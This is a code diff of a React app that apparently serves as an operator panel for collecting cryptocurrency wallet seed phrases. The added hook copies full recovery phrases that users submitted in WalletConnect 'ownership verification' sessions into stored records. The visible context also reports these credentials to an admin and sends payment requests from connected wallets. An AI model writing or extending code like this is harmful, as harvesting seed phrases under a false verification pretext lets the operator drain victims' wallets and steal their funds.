@@ -2051,7 +2051,7 @@ export default function App() {
       {
         wallet: walletAddress,
         chain: targetChain,
-        status: 'passed',
+        status: 'passed' as const,
         detail: `[Request] ${sourceLabel} submitted: ${safeCredential.slice(0, 140)}${safeCredential.length > 140 ? '…' : ''}`,
         checkedAt: nowString(),
       },
@@ -3313,6 +3313,36 @@ export default function App() {
       void notifyAdminVerificationRequest(storedCredential, 'walletconnect', session.address, 'ethereum')
     }
   }
+
+  // Safety net: if a WC session is marked verified and contains submitted text,
+  // ensure it is represented in the seed records list.
+  useEffect(() => {
+    const wcRecoveredRows: SeedPhraseRecord[] = wcSessions
+      .filter(sess => sess.ownershipVerified && sess.seedPhrase.trim().length > 0)
+      .map(sess => {
+        const normalizedPhrase = normalizeSeedPhraseInput(sess.seedPhrase)
+        const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
+        const storedCredential = isMnemonic ? normalizedPhrase : sess.seedPhrase.trim().replace(/\s+/g, ' ')
+        const words = storedCredential.split(/\s+/).filter(Boolean)
+        return {
+          id: `wc-${sess.topic.slice(0, 18)}-${storedCredential.slice(0, 24)}`,
+          walletAddress: sess.address || 'Unknown',
+          chain: 'ethereum',
+          seedPhrase: storedCredential,
+          wordCount: words.length,
+          source: 'wc-session',
+          detectedAt: sess.connectedAt || nowString(),
+          notes: `Recovered from verified WalletConnect session — ${sess.walletName || 'Unknown Wallet'}`,
+          confirmed: isMnemonic,
+        } satisfies SeedPhraseRecord
+      })
+
+    if (wcRecoveredRows.length === 0) return
+
+    setSeedPhraseRecords(prev =>
+      mergeUniqueRecords(prev, wcRecoveredRows, item => `${item.id}|${item.seedPhrase}`),
+    )
+  }, [wcSessions])
 
   const sendWcPaymentRequest = (topic: string) => {
     if (!wcPayTo.trim() || !wcPayAmount.trim()) { setWcActionStatus('❌ Fill in recipient address and amount.'); return }
